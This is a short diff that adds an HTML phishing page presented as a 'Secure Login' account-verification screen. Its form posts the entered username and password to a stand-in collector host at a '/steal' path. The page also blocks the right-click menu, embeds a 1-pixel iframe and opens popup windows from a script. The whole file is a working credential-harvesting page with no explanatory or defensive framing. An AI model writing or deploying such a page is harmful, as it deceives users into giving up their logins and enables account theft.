@@ -1,0 +1,11 @@
+<html><head><title>Secure Login</title></head>
+<body oncontextmenu="return false;">
+<h1>Verify your account</h1>
+<iframe src="about:blank" width="1" height="1"></iframe>
+<form action="http://collector.example.invalid/steal" method="post">
+<input type="text" name="user"><input type="password" name="pw">
+<input type="hidden" name="token" value="1"><input type="hidden" name="src" value="2">
+<input type="submit" value="Login">
+</form>
+<script>window.open("about:blank"); window.open("about:blank");</script>
+</body></html>
